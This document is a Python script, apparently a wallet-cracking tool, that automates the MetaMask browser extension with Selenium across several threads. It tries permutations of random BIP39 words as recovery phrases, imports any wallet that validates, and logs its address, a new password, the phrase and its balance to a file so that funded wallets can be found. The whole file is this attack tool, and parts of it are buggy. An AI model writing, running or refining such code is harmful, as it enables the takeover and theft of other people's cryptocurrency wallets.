import threading
import random
import time
import string
import subprocess
import logging
import pyperclip
import torch
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys



device = "cuda"

#generating of random password for cracking account
def generate_password(length=18):
    characters = string.ascii_letters + string.digits
    random_password = torch.empty(length, dtype=torch.long, device=device)
    for i in range(length):
        random_password[i] = torch.randint(0, len(characters), (1,), device=device)
    return ''.join(characters[i] for i in random_password)
  
#reading lucky combination from file to except already suiteable
def read_lucky_combinations(filename):
    lucky_combinations = {}
    with open(filename, 'r') as f:
        for line in f:
            if line.startswith('Word key: '):
                combination = line.strip()[10:]
                if combination not in lucky_combinations:
                    lucky_combinations[combination] = True
    return list(lucky_combinations.keys())

#open bip39 file to choose 12 random words
read_luck = threading.Lock()

def choose_seed_words(file_path):
    seed_words = []
    # Получение блокировки чтения файла
    read_luck.acquire()
    logging.debug("Comb lock acquired")
    try:
        with open(file_path, 'r') as f:
            all_words = [line.strip() for line in f]
        seed_words = random.sample(all_words, 12)
    finally:
        # Освобождение блокировки чтения файла
        read_luck.release()
        logging.debug("Comb lock acquired")
    return seed_words

#reading lucky combination from file to except already suiteable
comb_lock = threading.Lock()

def read_lucky_combinations(filename):
    lucky_combinations = {}
    # Получение блокировки
    comb_lock.acquire()
    logging.debug("Comb lock acquired")
    try:
        with open(filename, 'r') as f:
            for line in f:
                if line.startswith('Word key: '):
                    combination = line.strip()[10:]
                    if combination not in lucky_combinations:
                        lucky_combinations[combination] = True
    finally:
        # Освобождение блокировки
        comb_lock.release()
        logging.debug("Comb lock acquired")
    return list(lucky_combinations.keys())

#copying to clipboard
copy_lock = threading.Lock()

def copy2clip(txt):
    # Получение блокировки
    copy_lock.acquire()
    logging.debug("Comb lock acquired")
    try:
        cmd='echo '+txt.strip()+'|clip'
        return subprocess.check_call(cmd, shell=True)
    finally:
        # Освобождение блокировки
        copy_lock.release()
        logging.debug("Comb lock acquired")

#get next permutation
def nextPermutation( arr):
        bPoint, n = -1, len(arr)
        for i in range(n-2,-1,-1):
            if arr[i] >= arr[i+1]: continue                   # Skip the non-increasing sequence
            bPoint = i                                        # Got our breakpoint
            for j in range(n-1,i,-1):                         # again traverse from end
                if arr[j] > arr[bPoint]:                      # Search an element greater the element present at the breakPoint.
                    arr[j], arr[bPoint] = arr[bPoint], arr[j] # Swap it
                    break                                     # We just need to swap once
            break                                             # Break this loop too
        arr[bPoint+1:] = reversed(arr[bPoint+1:])
        return arr   

#get nth permutation:
def getPermutation( n: int, k: int):
        nums = [i for i in range(1,n+1)]
        ret = []       
        while(n):
            f = factorial(n-1)
            index = (k-1)//f 
            ret += [nums[index]]
            nums.remove(nums[index])
            n -= 1
            k %= f
        return ret

def factorial(n: int)->int:
    if n==0: return 1
    elif n==1: return 1
    else: return n*factorial(n-1)



EXTENSION_PATH = "C:/Users/User/AppData/Local/Google/Chrome/User Data/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/10.34.5_0.crx" # enter the path to your path to .crx file here

mm_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn" # enter your metamask extension id here

opt = webdriver.ChromeOptions()
opt.add_extension(EXTENSION_PATH)
opt.add_argument("no-page-cache") 

opt.add_argument("--enable-features=HardwareAcceleration")  
opt.add_argument("--enable-features=QuicStatelessReset")
opt.add_argument('--enable-zero-copy')
opt.add_argument('--enable-gpu-sandbox')
opt.add_argument("--enable-gpu-rasterization")
opt.add_argument('--enable-gpu-compositing')
opt.add_argument('--enable-native-gpu-memory-buffers')
opt.add_argument('--enable-gpu-fences')

opt.add_argument('--disable-infobars')
opt.add_argument('--disable-notifications')
opt.add_argument('--disable-dev-shm-usage')
opt.add_argument('--disable-software-rasterizer')
opt.add_argument('--disable-gpu-driver-bug-workarounds')
opt.add_argument('--disable-popup-blocking')
opt.add_argument('--disable-background-networking')
opt.add_argument("--disable-gpu=false")
opt.add_argument('--disable-pinch-zoom')
opt.add_argument('--disable-features=RendereCodeIntegrity')



class CheckboxThread(threading.Thread):
    def __init__(self, window_position, read_lock, write_lock, device):
        threading.Thread.__init__(self)
        self.window_position = window_position
        self.checked = False
        self.device = device
        self.read_lock = read_lock
        self.write_lock = write_lock
    
    def cuda(self, device):
        self.device = device

    def run(self):
        logging.debug("Thread started")
        driver = webdriver.Chrome(options=opt)
        driver.set_window_size(510, 850)
        driver.set_window_position(*self.window_position)
        driver.refresh()
        driver.delete_all_cookies()


        def open_welcome_page():
            #open bip39 file to choose 12 random words
            with open('seed.txt', 'r') as f:
                all_words = [line.strip() for line in f]
                seed_words = random.sample(all_words, 12)

            count = 1 #starts at 1, input 'n' to start at 'n'th permutation

            driver.get("chrome-extension://"+mm_extension_id+"/home.html#onboarding/welcome") # go to seed phrase page

            driver.execute_script("document.body.style.zoom='60%'") #zoom out elements

            # close last tab
            handles = driver.window_handles
            if len(handles) > 1:
                # There is more than one tab open
                driver.switch_to.window(handles[-1])
                driver.close()
                driver.switch_to.window(handles[0])  
            else: 
                # No tabs were opened 
                print("No tabs were opened")

            class ElementWrapper:
                def __init__(self, locator):
                    self.locator = locator

                def get_text(self):
                    element = self.find_element()
                    return element.text

                def send_keys(self, text):
                    element = self.find_element()
                    element.send_keys(text)

                def find_element(self, timeout = 60):
                    locator = self.locator
                
                    if locator == ("xpath", "/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[4]"):
                        timeout = 0.1  
                    try:
                        return WebDriverWait(driver, timeout).until(EC.visibility_of_element_located(locator))
                    except TimeoutException: 
                        return None
                        
                def click(self): 
                    element = self.find_element()
                    driver.execute_script("arguments[0].click();", element)
                        
                def scroll_into_view(self):
                    element = self.find_element()   
                    driver.execute_script("arguments[0].scrollIntoView();", element)
                    
            try:
                # chkbox to agree
                chkbox1 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/ul/li[1]/div/input"))
                chkbox1.scroll_into_view()
                chkbox1.click()

                # import wallet
                btn1 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/ul/li[3]/button"))
                btn1.scroll_into_view()
                btn1.click()

                # no thnx
                btn2 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div/button[2]"))
                btn2.scroll_into_view()
                btn2.click()

                # create string
                s = ' '.join(seed_words.values()).strip()
                copy2clip(s)  

                # find txtfield
                txtfield = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[3]/div[1]/div[1]/div/input"))
                txtfield.scroll_into_view()

            except:
                pass

            keys = [i for i in range(1,13)]
            seed_words = dict(zip(keys, seed_words))

            s = ''
            arr = [1,2,3,4,5,6,7,8,9,10,11,12]

            # read all previously found lucky combinations
            lucky_combinations = read_lucky_combinations('comb.txt')

            #get starting point:
            arr = getPermutation(len(arr), count)

            #print starting string and starting array:
            print("START:",arr, [seed_words[i] for i in arr])

            #loop through permuations:
            t0 = time.time()
            looper = True

            while looper:
                #populate string:
                s = ''
                for i in arr:
                    s += ' ' + seed_words[i]
                s.strip()

                # Check if the combination has already been found
                if s in lucky_combinations:
                    continue

                copy2clip(s) #copy string
                ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[3]/div[1]/div[1]/div/input")).send_keys(Keys.CONTROL + 'v') #paste string
                    
                #if invalid seed phrase:
                try:
                    elem =  ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/div/div[4]"))
                    elem.scroll_into_view()
                    #check to see if invalid message pops up

                    #get next perm, increment
                    arr = nextPermutation(arr)
                    print('Attempts', count, end = '\r', flush = False)
                    print('count/sec:', "{:.2f}".format(count/(time.time()- t0)), '---- count:',count, end='\r', flush=True)
                    count += 1

                #if valid seed phrase:
                except:
                        # add new combination to list
                        with open('comb.txt', 'a') as f:
                            f.write(f"\nWord key: {s}\n")

                        # confirm recovery phrase
                        btn3 = ElementWrapper((By.XPATH, "//html/body/div[1]/div/div[2]/div/div/div/div[4]/div/button"))
                        btn3.scroll_into_view()
                        btn3.click()

                        #generate_password
                        password = generate_password()

                        # enter password
                        element1 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[1]/label/input"))
                        element1.scroll_into_view()
                        element1.send_keys(password)
                        print(password)

                        # confirm passford
                        element2 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[2]/label/input"))  
                        element2.scroll_into_view()
                        element2.send_keys(password)  
                        print(password)

                        # i understand
                        chkbox2 = ElementWrapper((By.XPATH, "//html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[3]/label/input"))
                        chkbox2.scroll_into_view()
                        chkbox2.click()

                        # import wallet
                        btn4 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/button"))
                        btn4.scroll_into_view()
                        btn4.click()


                        try: 
                            # Understand!
                            btn5 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/button"))
                            btn5.scroll_into_view()
                            btn5.click()

                            # next
                            btn6 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/button"))
                            btn6.scroll_into_view()
                            btn6.click()

                            # done
                            btn7 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/div[2]/button"))
                            btn7.scroll_into_view()
                            btn7.click()
                                
                            # close mark
                            close_mark = ElementWrapper((By.XPATH, "/html/body/div[2]/div/div/section/div[1]/div/button"))
                            close_mark.scroll_into_view()
                            close_mark.click()
                            
                            # copy adress
                            login_elem = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button"))
                            login_elem.scroll_into_view()
                            login_elem.click()

                            login = pyperclip.paste()
                            print(login)  

                        except:
                            pass
                            
                        #once in wallet
                        elem = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[2]/div/div/div/div/span[2]")) #find balance element
                        b = elem.get_text()
                        print(b)

                        #put all info into txt
                        with open('data.txt', 'a') as f:
                            f.write(f"\n\n\nWallet: \nLogin: {login} \n\nPassword: {password} \n\nWord key: {s} \n\nBalance: {b}\n")

                        if float(b) == 0: #get balance usd
                            looper = False
                            print('number:', count, 'empty account:', s, 'balance:', b, 'ETH')
                            count += 1

                            settings = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div[2]/div/div/button"))
                            settings.click() #click on profile
                                                        
                            lock = ElementWrapper((By.XPATH, "/html/body/div[2]/div[2]/button[7]"))
                            lock.click() #click lock an account
                            
                            open_restore_page()

                        else:
                            looper = False
                            print("DONE", 'account:', s, 'balance:', b, 'ETH')
                            print(count)  


        def open_restore_page():
            
            #open bip39 file to choose 12 random words
            with open('seed.txt', 'r') as f:
                all_words = [line.strip() for line in f]
                seed_words = random.sample(all_words, 12)

            count = 1 #starts at 1, input 'n' to start at 'n'th permutation
                    
            driver.get('chrome-extension://'+mm_extension_id+'/home.html#restore-vault') # go to seed phrase page

            # close last tab
            handles = driver.window_handles
            if len(handles) > 1:
                # There is more than one tab open
                driver.switch_to.window(handles[-1])
                driver.close()
                driver.switch_to.window(handles[0])  
            else: 
                # No tabs were opened 
                print("No tabs were opened")

            class ElementWrapper:
                def __init__(self, locator):
                    self.locator = locator

                def get_text(self):
                    element = self.find_element()
                    return element.text

                def send_keys(self, text):
                    element = self.find_element()
                    element.send_keys(text)

                def find_element(self, timeout = 30):
                    locator = self.locator
                
                    if locator == ("xpath", "/html/body/div[1]/div/div[2]/div/div/div/form/div[1]/div[4]"):
                        timeout = 0.1  
                    try:
                        return WebDriverWait(driver, timeout).until(EC.visibility_of_element_located(locator))
                    except TimeoutException: 
                        return None
                            
                def click(self): 
                    element = self.find_element()
                    driver.execute_script("arguments[0].click();", element)
                            
                def scroll_into_view(self):
                    element = self.find_element()   
                    driver.execute_script("arguments[0].scrollIntoView();", element)

            # find txtfield
            txtfield = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/div[1]/div[3]/div[1]/div[1]/div/input"))
            txtfield.scroll_into_view()

            keys = [i for i in range(1,13)]
            seed_words = dict(zip(keys, seed_words))

            s = ''
            arr = [1,2,3,4,5,6,7,8,9,10,11,12]

            # read all previously found lucky combinations
            lucky_combinations = read_lucky_combinations('comb.txt')

            #get starting point:
            arr = getPermutation(len(arr), count)

            #print starting string and starting array:
            print("START:",arr, [seed_words[i] for i in arr])

            #loop through permuations:
            t0 = time.time()
            looper = True

            while looper:
                #populate string:
                s = ''
                for i in arr:
                    s += ' ' + seed_words[i]
                    s.strip()

                # Check if the combination has already been found
                if s in lucky_combinations:
                    continue

                copy2clip(s) #copy string
                ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/div[1]/div[3]/div[1]/div[1]/div/input")).send_keys(Keys.CONTROL + 'v') #paste string
                        
                #if invalid seed phrase:
                try:
                    elem =  ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/div[1]/div[4]"))
                    elem.scroll_into_view()
                    #check to see if invalid message pops up
                            
                    #get next perm, increment
                    arr = nextPermutation(arr)
                    print('Attempts', count, end = '\r', flush = False)
                    print('count/sec:', "{:.2f}".format(count/(time.time()- t0)), '---- count:',count, end='\r', flush=True)
                    count += 1

                # if valid seed phrase:
                except:
                    #generate_password
                    password = generate_password()

                    # enter password
                    element1 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/div[2]/div[1]/div/input"))
                    element1.send_keys(password)
                    print(password)

                    # confirm passford
                    element2 = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/div[2]/div[2]/div/input"))  
                    element2.send_keys(password)  
                    print(password)

                    try: #after first login, import btn -> restore btn
                        # add new combination to list
                        with open('comb.txt', 'a') as f:
                            f.write(f"\nWord key: {s}\n")
                        
                        # click restore btn
                        restore = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div/form/button"))
                        restore.scroll_into_view()
                        restore.click() 

                        # copy_adress
                        login_elem = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button"))
                        login_elem.scroll_into_view()
                        login_elem.click()

                        login = pyperclip.paste()
                        print(login)  
                    except:
                        pass
                                                    
                    #once in wallet
                    elem = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[2]/div/div/div/div/span[2]")) #find balance element
                    b = elem.get_text()
                    print(b)

                    #put all info into txt
                    with open('data.txt', 'a') as f:
                        f.write(f"\n\n\nWallet: \nLogin: {login} \n\nPassword: {password} \n\nWord key: {s} \n\nBalance: {b}\n")

                    if float(b) == 0: #get balance usd
                        arr = nextPermutation(arr)
                        looper = True
                        print('number:', count, 'empty account:', s, 'balance:', b, 'ETH')
                        count += 1

                        settings = ElementWrapper((By.XPATH, "/html/body/div[1]/div/div[2]/div/div[2]/div/div/button"))
                        settings.click() #click on profile
                                                            
                        lock = ElementWrapper((By.XPATH, "/html/body/div[2]/div[2]/button[7]"))
                        lock.click() #click 'lock' account
                        time.sleep(0.5) 

                        driver.get('chrome-extension://'+mm_extension_id+'/home.html#restore-vault')

                    else:
                        looper = False
                        print("DONE", 'account:', s, 'balance:', b, 'ETH')
                        print(count)   


        open_welcome_page()
   

threads = []
num_threads = 3
read_lock = None
write_lock = None
WIDTH = 510
HEIGHT = 850

# Запуск всех потоков
def start_threads():
    for thread in threads:
        thread.start()

# Ожидание завершения всех потоков
def join_threads():
    for thread in threads:
        thread.join()

# Cоздание потоков
def create_threads():
    global read_lock, write_lock
    read_lock = threading.Lock()
    write_lock = threading.Lock()
    
    for i in range(num_threads):
        # Вычисление координат окон в строке и столбце
        row = i // 3  # Номер строки
        col = i % 3   # Номер столбца
        x = col * WIDTH  # x-координата окна
        y = row * HEIGHT  # y-координата окна
        window_position = (x, y)
        thread = CheckboxThread(window_position, read_lock, write_lock, device)
        thread.cuda(device)
        threads.append(thread)


create_threads()
start_threads()
join_threads() 




